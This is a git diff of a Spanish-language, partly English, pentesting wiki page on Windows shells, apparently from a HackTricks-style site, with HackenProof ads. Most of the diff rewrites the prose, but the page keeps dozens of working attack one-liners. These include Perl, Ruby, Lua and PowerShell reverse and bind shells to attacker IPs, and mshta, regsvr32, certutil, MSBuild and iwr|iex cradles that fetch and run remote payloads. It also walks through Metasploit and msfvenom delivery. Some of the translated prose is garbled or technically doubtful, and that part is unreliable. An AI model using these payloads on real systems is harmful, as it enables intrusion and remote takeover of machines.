@@ -12,7 +12,7 @@
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 **HackenProof es el hogar de todas las recompensas por errores de criptografía.**
 
@@ -49,50 +49,58 @@ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('1
 ```
 ## Perl
 
-Perl es un lenguaje de programación interpretado y de alto nivel que se utiliza comúnmente en el desarrollo de scripts y aplicaciones web. Es conocido por su flexibilidad y potencia, lo que lo convierte en una herramienta popular entre los hackers.
+Perl es un lenguaje de programación interpretado y versátil que se utiliza comúnmente en el desarrollo de scripts y en la administración de sistemas. Es especialmente útil para la automatización de tareas y el procesamiento de texto. Perl proporciona una amplia gama de funciones y módulos que facilitan la manipulación de archivos, la comunicación en red y la interacción con el sistema operativo.
 
-### Ejecución de comandos
+### Ejecución de comandos en Windows
 
-Perl proporciona una forma sencilla de ejecutar comandos en el sistema operativo subyacente utilizando la función `system()`. Esta función toma como argumento una cadena que representa el comando a ejecutar y devuelve el resultado de la ejecución.
+En Windows, se puede utilizar Perl para ejecutar comandos del sistema y obtener la salida resultante. Esto puede ser útil para realizar tareas como la enumeración de archivos, la obtención de información del sistema y la ejecución de programas externos.
+
+Para ejecutar un comando en Windows utilizando Perl, se puede utilizar la función `system()` o la función `backticks`. Ambas funciones permiten ejecutar comandos y capturar la salida resultante.
+
+#### Ejemplo: Ejecutar el comando "ipconfig"
 
 ```perl
-system("comando");
+my $output = `ipconfig`;
+print $output;
 ```
 
-### Manipulación de archivos
+En este ejemplo, el comando `ipconfig` se ejecuta utilizando la función `backticks` y la salida resultante se almacena en la variable `$output`. Luego, se imprime el contenido de la variable `$output`.
 
-Perl también ofrece una amplia gama de funciones para manipular archivos. Puedes abrir, leer, escribir y cerrar archivos utilizando las siguientes funciones:
-
-- `open()`: Abre un archivo en modo de lectura o escritura.
-- `read()`: Lee una cantidad específica de bytes de un archivo.
-- `write()`: Escribe una cadena en un archivo.
-- `close()`: Cierra un archivo abierto.
+#### Ejemplo: Ejecutar el comando "dir" con argumentos
 
 ```perl
-open(FILE, "archivo.txt");
-$contenido = <FILE>;
-close(FILE);
+my $output = `dir /s /b`;
+print $output;
 ```
 
-### Expresiones regulares
+En este ejemplo, el comando `dir` se ejecuta con los argumentos `/s` y `/b`, que muestran una lista de archivos en formato breve y recursivamente. La salida resultante se almacena en la variable `$output` y se imprime.
 
-Las expresiones regulares son una herramienta poderosa para buscar y manipular patrones de texto en Perl. Puedes utilizar expresiones regulares para realizar búsquedas, reemplazos y extracciones de texto.
+### Manipulación de archivos en Windows
+
+Perl también proporciona funciones para manipular archivos en Windows. Estas funciones permiten crear, leer, escribir y modificar archivos.
+
+#### Ejemplo: Leer el contenido de un archivo
 
 ```perl
-if ($cadena =~ /patrón/) {
-    # Realiza una acción si se encuentra el patrón
+open(my $file, '<', 'archivo.txt') or die "No se pudo abrir el archivo: $!";
+while (my $line = <$file>) {
+    chomp $line;
+    print "$line\n";
 }
+close($file);
 ```
 
-### Módulos CPAN
+En este ejemplo, se abre el archivo `archivo.txt` en modo de lectura utilizando la función `open()`. Luego, se lee el contenido del archivo línea por línea utilizando un bucle `while`. Cada línea se imprime y se elimina el carácter de nueva línea utilizando la función `chomp()`. Finalmente, se cierra el archivo utilizando la función `close()`.
 
-CPAN (Comprehensive Perl Archive Network) es una colección de módulos Perl que puedes utilizar para ampliar las capacidades de Perl. Puedes instalar módulos CPAN utilizando el comando `cpan` en la línea de comandos.
+#### Ejemplo: Escribir en un archivo
 
 ```perl
-use NombreDelModulo;
+open(my $file, '>', 'archivo.txt') or die "No se pudo abrir el archivo: $!";
+print $file "Hola, mundo!\n";
+close($file);
 ```
 
-Estos son solo algunos ejemplos de las capacidades de Perl en el hacking. Con su amplia gama de funciones y su comunidad activa, Perl es una herramienta poderosa para cualquier hacker.
+En este ejemplo, se abre el archivo `archivo.txt` en modo de escritura utilizando la función `open()`. Luego, se escribe la cadena "Hola, mundo!" en el archivo utilizando la función `print()`. Finalmente, se cierra el archivo utilizando la función `close()`.
 ```bash
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
@@ -121,9 +129,9 @@ Para instalar Ruby en Windows, puedes seguir estos pasos:
 
 Para ejecutar un script Ruby en Windows, sigue estos pasos:
 
-1. Abre el símbolo del sistema (Command Prompt) y navega hasta la ubicación del archivo de script Ruby utilizando el comando `cd`.
+1. Abre el símbolo del sistema (Command Prompt) y navega hasta la ubicación del archivo de script Ruby.
 
-2. Una vez que estés en la ubicación correcta, ejecuta el siguiente comando para ejecutar el script:
+2. Ejecuta el siguiente comando para ejecutar el script:
 
    ```
    ruby nombre_del_script.rb
@@ -133,34 +141,26 @@ Para ejecutar un script Ruby en Windows, sigue estos pasos:
 
 ### Interacción con la consola de Ruby
 
-Puedes interactuar con la consola de Ruby en Windows siguiendo estos pasos:
+Ruby proporciona una consola interactiva que te permite ejecutar código Ruby en tiempo real. Para abrir la consola de Ruby en Windows, sigue estos pasos:
 
-1. Abre el símbolo del sistema (Command Prompt) y ejecuta el siguiente comando para abrir la consola de Ruby:
+1. Abre el símbolo del sistema (Command Prompt).
+
+2. Ejecuta el siguiente comando para abrir la consola de Ruby:
 
    ```
    irb
    ```
 
-2. Ahora puedes ingresar y ejecutar comandos de Ruby directamente en la consola. Por ejemplo, puedes escribir `puts "Hola, mundo"` y presionar Enter para ver el resultado.
-
-   ```
-   irb(main):001:0> puts "Hola, mundo"
-   Hola, mundo
-   => nil
-   ```
-
-   Para salir de la consola de Ruby, simplemente escribe `exit` y presiona Enter.
+   Ahora puedes ingresar y ejecutar código Ruby directamente en la consola.
 
 ### Recursos adicionales
 
 Aquí hay algunos recursos adicionales que pueden ser útiles para aprender más sobre Ruby:
 
-- [Documentación oficial de Ruby](https://www.ruby-lang.org/es/documentation/)
-- [RubyGems](https://rubygems.org/): un administrador de paquetes para Ruby
-- [Ruby Toolbox](https://www.ruby-toolbox.com/): una colección de herramientas y bibliotecas populares de Ruby
-- [Ruby on Rails](https://rubyonrails.org/): un framework de desarrollo web basado en Ruby
-
-¡Diviértete explorando Ruby y desarrollando tus habilidades de programación!
+- [Sitio web oficial de Ruby](https://www.ruby-lang.org)
+- [Ruby-Doc.org](https://ruby-doc.org) - Documentación oficial de Ruby
+- [RubyGems.org](https://rubygems.org) - Repositorio de gemas de Ruby
+- [Ruby on Rails](https://rubyonrails.org) - Framework de desarrollo web basado en Ruby
 ```bash
 #Windows
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -179,36 +179,34 @@ El shell de Lua te permite ejecutar comandos y scripts de Lua directamente desde
 
 Para ejecutar un comando de Lua en el shell, simplemente escribe el código Lua y presiona Enter. El shell ejecutará el comando y mostrará el resultado en la siguiente línea.
 
-Por ejemplo, puedes ejecutar el siguiente comando para imprimir "Hola, mundo!" en el shell:
+Por ejemplo, puedes ejecutar el siguiente comando para imprimir "Hola, mundo!" en el shell de Lua:
 
 ```lua
 print("Hola, mundo!")
 ```
 
-El shell de Lua también admite variables, operaciones matemáticas y estructuras de control, lo que te permite realizar tareas más avanzadas.
-
 ### Ejecución de scripts de Lua
 
-Además de ejecutar comandos individuales, el shell de Lua también te permite ejecutar scripts completos almacenados en archivos. Para ejecutar un script de Lua, debes guardar el código en un archivo con extensión `.lua` y luego ejecutar el comando `lua` seguido del nombre del archivo.
+Además de ejecutar comandos individuales, también puedes ejecutar scripts de Lua completos en el shell. Para hacer esto, primero debes crear un archivo de texto con extensión `.lua` que contenga el código Lua que deseas ejecutar.
 
-Por ejemplo, si tienes un archivo llamado `mi_script.lua` que contiene el siguiente código:
+Una vez que hayas creado el archivo de script, puedes ejecutarlo en el shell utilizando el siguiente comando:
 
 ```lua
-local nombre = "Juan"
-print("Hola, " .. nombre .. "!")
+dofile("ruta/al/archivo.lua")
 ```
 
-Puedes ejecutar el script utilizando el siguiente comando:
+Reemplaza `"ruta/al/archivo.lua"` con la ruta real del archivo de script en tu sistema.
 
-```
-lua mi_script.lua
-```
+### Ventajas del shell de Lua en Windows
 
-El shell de Lua ejecutará el script y mostrará el resultado en la ventana de comandos.
+El shell de Lua en Windows ofrece varias ventajas para los desarrolladores y los entusiastas de Lua. Algunas de estas ventajas incluyen:
 
-### Conclusiones
+- Interfaz de línea de comandos fácil de usar para ejecutar comandos y scripts de Lua.
+- Integración con otros lenguajes y sistemas.
+- Capacidad para realizar pruebas rápidas y experimentar con código Lua.
+- Soporte para la ejecución de scripts de Lua completos.
 
-El shell de Lua en Windows es una herramienta útil para ejecutar comandos y scripts de Lua de forma interactiva. Puedes utilizarlo para probar y depurar código Lua, así como para automatizar tareas en tu sistema. Con su simplicidad y flexibilidad, Lua es una excelente opción para aquellos que deseen explorar la programación en un entorno de shell.
+Con el shell de Lua en Windows, puedes aprovechar al máximo el poder y la flexibilidad de Lua en tu entorno de desarrollo.
 ```bash
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
@@ -288,6 +286,12 @@ PowerShell también se puede utilizar para crear un shell bind en Windows. Para 
 powershell.exe -c "$listener = [System.Net.Sockets.TcpListener]'<ip_atacante>', <puerto>; $listener.start(); $client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
 ```
 
+Luego, en el sistema comprometido, el atacante debe ejecutar el siguiente comando para establecer la conexión:
+
+```
+nc <ip_atacante> <puerto>
+```
+
 Esto establecerá una conexión de shell bind utilizando PowerShell.
 ```bash
 #Linux
@@ -310,7 +314,7 @@ Get-Process
 
 ### Variables y tipos de datos
 
-Powershell admite variables para almacenar y manipular datos. Las variables se pueden declarar utilizando el prefijo "$". Por ejemplo:
+Powershell admite variables para almacenar y manipular datos. Las variables se pueden declarar utilizando el prefijo "$" seguido del nombre de la variable. Por ejemplo:
 
 ```powershell
 $nombre = "Juan"
@@ -374,43 +378,13 @@ powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 Proceso que realiza una llamada de red: **svchost.exe**\
 Carga escrita en el disco: **caché local del cliente WebDAV**
 
-**Línea de comando:**
+**En una línea:**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-Mshta is a Windows utility that allows you to execute HTML applications (HTAs) using the Microsoft HTML Application Host. HTAs are standalone applications that can be executed directly from the Windows shell without the need for a web browser.
+**Obtén más información sobre diferentes Shells de Powershell al final de este documento**
 
-### Usage
-
-To execute a command using Mshta, you can use the following syntax:
-
-```
-mshta.exe javascript:command;
-```
-
-For example, to display a message box with the text "Hello, World!", you can use the following command:
-
-```
-mshta.exe javascript:alert('Hello, World!');
-```
-
-### Advantages
-
-Mshta can be useful in scenarios where you want to execute arbitrary commands on a target system without relying on traditional command-line utilities. Since HTAs are executed by the HTML Application Host, they have the ability to interact with the Windows shell and perform various actions.
-
-### Limitations
-
-It's important to note that Mshta requires the target system to have the HTML Application Host installed. Additionally, some security measures, such as antivirus software, may flag the execution of HTAs as suspicious activity.
-
-### Detection
-
-Detecting the execution of Mshta can be challenging, as it is a legitimate Windows utility. However, monitoring for suspicious command-line arguments or unusual network activity may help in identifying its usage.
-
-### Mitigation
-
-To mitigate the risks associated with Mshta, it is recommended to restrict its usage on systems where it is not required. Additionally, keeping the system and antivirus software up to date can help in preventing potential exploits.
-
-For more information on different Powershell shells, refer to the [Powershell Shells](../shells/powershell.md) section at the end of this document.
+## Mshta
 ```bash
 mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
 ```
@@ -501,13 +475,13 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 
 Mshta is a Microsoft utility that allows the execution of HTML applications (HTAs) on Windows systems. It is often used by attackers to bypass security measures and execute malicious code.
 
-Metasploit, a popular penetration testing framework, includes a module called `exploit/windows/browser/mshta` that exploits the mshta utility. This module generates an HTA file that contains the payload to be executed on the target system.
+Metasploit, a popular penetration testing framework, includes a module that leverages mshta to deliver payloads to target systems. This module, called "exploit/windows/browser/mshta", allows an attacker to create a malicious HTA file and deliver it to a victim's system.
 
-To use this module, you need to set the `SRVHOST`, `SRVPORT`, and `URIPATH` options. The `SRVHOST` and `SRVPORT` options specify the IP address and port on which the HTA file will be hosted. The `URIPATH` option specifies the path of the HTA file on the server.
+To use this module, the attacker needs to set the "SRVHOST" and "SRVPORT" options to specify the IP address and port of the Metasploit listener. The "URIPATH" option can be used to specify a custom URI path for the HTA file.
 
-Once the options are set, you can run the exploit by executing the `exploit` command. This will start a web server hosting the HTA file. When the target user opens the HTA file, the payload will be executed on their system.
+Once the options are set, the attacker can run the exploit and wait for the victim to open the HTA file. When the file is opened, the payload is executed on the target system, giving the attacker remote access.
 
-It is important to note that the mshta utility may trigger security alerts, as it is commonly used in malicious activities. Therefore, it is crucial to use this technique responsibly and only in authorized penetration testing scenarios.
+It is important to note that the mshta module in Metasploit is just one of many techniques that can be used to exploit vulnerabilities in Windows systems. As a penetration tester, it is crucial to understand and utilize a variety of tools and techniques to ensure comprehensive testing and assessment of target systems.
 ```bash
 use exploit/windows/misc/hta_server
 msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
@@ -553,25 +527,28 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 ```
 #### **Rundll32 - Metasploit**
 
-Rundll32 is a Windows utility that allows the execution of DLL files as if they were executable files. This can be leveraged by an attacker to load and execute malicious code in the context of another process.
+Rundll32 is a Windows utility that allows the execution of DLL files as if they were executable files. This can be leveraged by an attacker to execute malicious code on a target system.
 
-Metasploit, a popular penetration testing framework, provides a module called `windows/local/hta` that can be used to generate a malicious HTA file. This file can then be executed using Rundll32, allowing the attacker to gain control over the target system.
+Metasploit, a popular penetration testing framework, provides a module called `windows/local/hta` that can be used to generate a malicious HTA file. This file can then be executed using Rundll32 to achieve code execution on the target system.
 
 To use this technique, follow these steps:
 
-1. Generate the malicious HTA file using the `windows/local/hta` module in Metasploit.
-2. Transfer the HTA file to the target system.
-3. Execute the HTA file using Rundll32 with the following command:
+1. Generate the malicious HTA file using the `windows/local/hta` module in Metasploit:
+```
+msf > use windows/local/hta
+msf exploit(windows/local/hta) > set LHOST <attacker IP>
+msf exploit(windows/local/hta) > set LPORT <attacker port>
+msf exploit(windows/local/hta) > exploit
+```
 
-   ```
-   rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://<attacker_ip>/payload.txt",false);try{h.Send();b=h.ResponseBody;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c echo " + e.message);}
-   ```
+2. Once the HTA file is generated, transfer it to the target system.
 
-   Replace `<attacker_ip>` with the IP address of the machine running the Metasploit listener.
+3. Execute the HTA file using Rundll32:
+```
+rundll32.exe <path to HTA file>,<entry point>
+```
 
-4. The HTA file will be executed, and the payload will be downloaded from the specified URL and executed on the target system.
-
-This technique can be used to bypass security measures that may block the execution of certain file types, as Rundll32 allows the execution of DLL files. It is important to note that this technique relies on social engineering to trick the user into executing the HTA file.
+By leveraging Rundll32 and Metasploit, an attacker can execute arbitrary code on a target system, potentially gaining unauthorized access or performing other malicious activities. It is important to note that this technique may trigger security alerts and should only be used in controlled environments for legitimate purposes such as penetration testing.
 ```bash
 use windows/smb/smb_delivery
 run
@@ -579,15 +556,15 @@ run
 ```
 **Rundll32 - Koadic**
 
-Rundll32 is a Windows utility that allows the execution of DLL files as functions. This can be leveraged by hackers to load malicious DLLs and execute their code. One popular tool that utilizes Rundll32 for post-exploitation is Koadic.
+Rundll32 is a Windows utility that allows the execution of DLL files as functions. This can be leveraged by attackers to load malicious DLLs and execute their code. One popular tool that utilizes this technique is Koadic.
 
-Koadic is a post-exploitation RAT (Remote Access Trojan) that provides a command and control (C2) framework for Windows systems. It allows hackers to gain remote access to compromised machines and perform various malicious activities.
+Koadic is a post-exploitation RAT (Remote Access Trojan) that provides a command-and-control interface to interact with compromised systems. It uses the rundll32 utility to load its DLL payload and establish a backdoor on the target machine.
 
-To use Koadic, the attacker first needs to establish a foothold on the target system. This can be achieved through various means, such as exploiting vulnerabilities, social engineering, or phishing attacks. Once the attacker has gained access, they can use Rundll32 to load the Koadic DLL and establish a connection with the C2 server.
+To use Koadic, the attacker first needs to generate a malicious DLL payload using the Koadic framework. This payload is then loaded using the rundll32 utility, which executes the code contained within the DLL. Once the payload is executed, the attacker gains remote access to the compromised system and can perform various malicious activities.
 
-Once the connection is established, the attacker can remotely control the compromised system and perform actions such as executing commands, uploading and downloading files, capturing screenshots, and even pivoting to other systems on the network.
+Koadic provides a wide range of features, including file system access, keylogging, screenshot capture, and network reconnaissance. It also supports multiple communication channels, such as HTTP, DNS, and ICMP, making it difficult to detect and block.
 
-Koadic provides a wide range of features and modules that can be used for different purposes, making it a powerful tool for post-exploitation activities. However, it is important to note that the use of Koadic or any other hacking tool for unauthorized activities is illegal and unethical. This information is provided for educational purposes only.
+To prevent attacks utilizing Rundll32 and Koadic, it is important to implement strong security measures, such as regularly updating software, using strong passwords, and employing network segmentation. Additionally, monitoring network traffic and using intrusion detection systems can help detect and mitigate potential threats.
 ```bash
 use stager/js/rundll32_js
 set SRVHOST 192.168.1.107
@@ -602,33 +579,47 @@ Regsvr32 es una utilidad de línea de comandos en Windows que se utiliza para re
 
 ### Uso básico
 
-Para registrar una DLL o un control ActiveX, se utiliza el siguiente comando:
+El comando básico para registrar una DLL o un control ActiveX utilizando Regsvr32 es el siguiente:
 
 ```
 regsvr32 <ruta_del_archivo>
 ```
 
-Donde `<ruta_del_archivo>` es la ubicación completa del archivo DLL o control ActiveX que se desea registrar.
+Donde `<ruta_del_archivo>` es la ubicación completa del archivo DLL o control ActiveX que se desea registrar. Una vez ejecutado el comando, Regsvr32 intentará registrar el archivo especificado en el Registro del sistema.
 
-Para desregistrar una DLL o un control ActiveX, se utiliza el siguiente comando:
+### Registro exitoso
+
+Si el registro es exitoso, Regsvr32 mostrará un mensaje de confirmación indicando que la operación se completó correctamente. Por ejemplo:
+
+```
+DllRegisterServer en <ruta_del_archivo> se realizó correctamente.
+```
+
+Esto significa que la DLL o el control ActiveX se han registrado correctamente en el sistema.
+
+### Registro fallido
+
+En caso de que el registro falle, Regsvr32 mostrará un mensaje de error indicando la causa del problema. Algunas posibles razones de fallo pueden ser:
+
+- El archivo DLL o control ActiveX no existe en la ubicación especificada.
+- El archivo DLL o control ActiveX está dañado o no es compatible con la versión del sistema operativo.
+- El usuario no tiene los permisos necesarios para registrar el archivo.
+
+En estos casos, es necesario solucionar el problema subyacente antes de intentar registrar nuevamente el archivo.
+
+### Desregistro de archivos
+
+Para desregistrar una DLL o un control ActiveX previamente registrado, se utiliza el siguiente comando:
 
 ```
 regsvr32 /u <ruta_del_archivo>
 ```
 
-Donde `<ruta_del_archivo>` es la ubicación completa del archivo DLL o control ActiveX que se desea desregistrar.
-
-### Consideraciones de seguridad
-
-Es importante tener en cuenta que Regsvr32 puede ser utilizado por atacantes para ejecutar código malicioso en un sistema comprometido. Por lo tanto, se recomienda tomar las siguientes precauciones:
-
-- Verificar la integridad de los archivos DLL y controles ActiveX antes de registrarlos.
-- Utilizar Regsvr32 solo en archivos de confianza y provenientes de fuentes confiables.
-- Mantener el sistema operativo y las aplicaciones actualizadas para evitar vulnerabilidades conocidas que puedan ser explotadas mediante Regsvr32.
+Donde `/u` indica que se desea desregistrar el archivo. Una vez ejecutado el comando, Regsvr32 intentará desregistrar el archivo especificado en el Registro del sistema.
 
 ### Conclusiones
 
-Regsvr32 es una herramienta útil para la instalación y desinstalación de DLL y controles ActiveX en sistemas Windows. Sin embargo, es importante utilizarla con precaución y tomar medidas de seguridad para evitar posibles ataques.
+Regsvr32 es una herramienta útil para registrar y desregistrar DLL y controles ActiveX en el Registro del sistema de Windows. Con su uso adecuado, es posible instalar y desinstalar componentes de software de manera efectiva en el sistema operativo.
 ```bash
 regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
@@ -668,12 +659,14 @@ The `regsvr32_command_delivery` module generates a malicious DLL file and regist
 To use this module, follow these steps:
 
 1. Set the payload to be delivered. This can be a reverse shell or any other payload supported by Metasploit.
-2. Set the `LHOST` and `LPORT` options to specify the IP address and port where the reverse shell will connect back to.
+2. Set the `LHOST` and `LPORT` options to specify the IP address and port of the attacker's machine.
 3. Run the module.
 
-Once the module is executed successfully, the attacker will have a reverse shell on the target system, providing them with remote access and control.
+Once the module is executed successfully, the attacker will have a reverse shell or the desired payload executed on the target system.
 
-It is important to note that this technique may trigger antivirus alerts, as it involves the execution of code from a DLL file. Therefore, it is recommended to use this technique in controlled environments or with proper authorization.
+This technique can be effective in scenarios where the target system has restrictions on executing certain file types but allows the execution of DLL files. It can also be used to bypass security measures that may be in place.
+
+It is important to note that the use of this technique may be detected by antivirus software or other security solutions. Therefore, it is recommended to use it in controlled environments or during authorized penetration testing activities.
 ```bash
 use multi/script/web_delivery
 set target 3
@@ -696,7 +689,7 @@ certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil
 ```
 **Detectado por el defensor**
 
-<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 **HackenProof es el hogar de todas las recompensas por errores de criptografía.**
 
@@ -719,7 +712,7 @@ powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0
 ```
 **Cscript - Metasploit**
 
-Cscript is a command-line scripting engine provided by Microsoft. It is commonly used for running VBScript or JScript scripts on Windows systems. Metasploit, on the other hand, is a popular penetration testing framework that includes various tools and exploits for testing the security of computer systems.
+Cscript is a command-line scripting engine provided by Microsoft. It is commonly used to execute VBScript or JScript scripts on Windows systems. Metasploit, on the other hand, is a popular penetration testing framework that includes various tools and exploits for testing the security of computer systems.
 
 When it comes to using Cscript with Metasploit, there are several techniques that can be employed. One common approach is to use Cscript as a payload delivery method. This involves creating a malicious script that, when executed, will download and execute a Metasploit payload on the target system.
 
@@ -735,30 +728,23 @@ Once you have the payload, you can create a malicious script that will download 
 
 ```vbs
 Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
-strURL = "http://<your IP address>/payload.vbs"
-strFile = "C:\Temp\payload.vbs"
-objXMLHTTP.open "GET", strURL, false
-objXMLHTTP.send()
+objXMLHTTP.open "GET", "http://<your IP address>/payload.vbs", False
+objXMLHTTP.send
 
-If objXMLHTTP.Status = 200 Then
-    Set objADOStream = CreateObject("ADODB.Stream")
-    objADOStream.Open
-    objADOStream.Type = 1
-    objADOStream.Write objXMLHTTP.ResponseBody
-    objADOStream.Position = 0
-    objADOStream.SaveToFile strFile
-    objADOStream.Close
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objFile = objFSO.CreateTextFile("C:\Temp\payload.vbs", True)
+objFile.Write objXMLHTTP.responseText
+objFile.Close
 
-    Set objShell = CreateObject("WScript.Shell")
-    objShell.Run "cscript.exe " & strFile, 0
-End If
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "C:\Windows\System32\cscript.exe C:\Temp\payload.vbs", 0
 ```
 
-In this script, the `objXMLHTTP` object is used to download the payload from the specified URL. The payload is then saved to a file on the target system (`C:\Temp\payload.vbs`). Finally, the `objShell` object is used to execute the payload using Cscript.
+In this script, the `objXMLHTTP` object is used to download the payload from your specified IP address. The `objFSO` object is then used to create a text file and write the downloaded payload into it. Finally, the `objShell` object is used to execute the payload using Cscript.
 
 To execute the script on the target system, you can use various methods such as social engineering, exploiting vulnerabilities, or using other techniques to trick the user into running the script.
 
-It is important to note that using Cscript with Metasploit or any other hacking technique without proper authorization is illegal and unethical. This information is provided for educational purposes only.
+Using Cscript with Metasploit can be an effective way to deliver and execute payloads on Windows systems. However, it is important to note that these techniques should only be used for authorized penetration testing and not for any malicious purposes.
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
 ```
@@ -823,9 +809,9 @@ Extraído de [aquí](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
 Proceso que realiza una llamada de red: **svchost.exe**\
-Carga escrita en el disco: **caché local del cliente WebDAV**
+Carga escrita en disco: **caché local del cliente WebDAV**
 
-Puedes utilizar esta técnica para evadir la lista blanca de aplicaciones y las restricciones de Powershell.exe. Se te solicitará una shell de PowerShell.\
+Puedes utilizar esta técnica para evadir la lista blanca de aplicaciones y las restricciones de Powershell.exe. Se te solicitará una shell de PS.\
 Simplemente descarga esto y ejecútalo: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
@@ -933,7 +919,7 @@ Inicia msfconsole con el recurso creado:
 ```
 msfconsole -r unicorn.rc
 ```
-Inicie un servidor web que sirva el archivo _powershell\_attack.txt_ y ejecútelo en la víctima:
+Inicie un servidor web que sirva el archivo _powershell\_attack.txt_ y ejecute en la víctima:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
@@ -956,7 +942,7 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) Consola de PS con algunos mód
 
 ​
 
-<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 **HackenProof es el hogar de todas las recompensas por errores de criptografía.**
 
@@ -967,7 +953,7 @@ Las recompensas de HackenProof se lanzan solo cuando sus clientes depositan el p
 ¡Los protocolos de blockchain y los contratos inteligentes son el nuevo Internet! Domina la seguridad web3 en sus días de crecimiento.
 
 **Conviértete en la leyenda del hacker web3**\
-Gana puntos de reputación con cada error verificado y conquista la cima de la tabla de clasificación semanal.
+Gana puntos de reputación con cada error verificado y conquista la cima de la clasificación semanal.
 
 [**Regístrate en HackenProof**](https://hackenproof.com/register) ¡comienza a ganar con tus hacks!
 
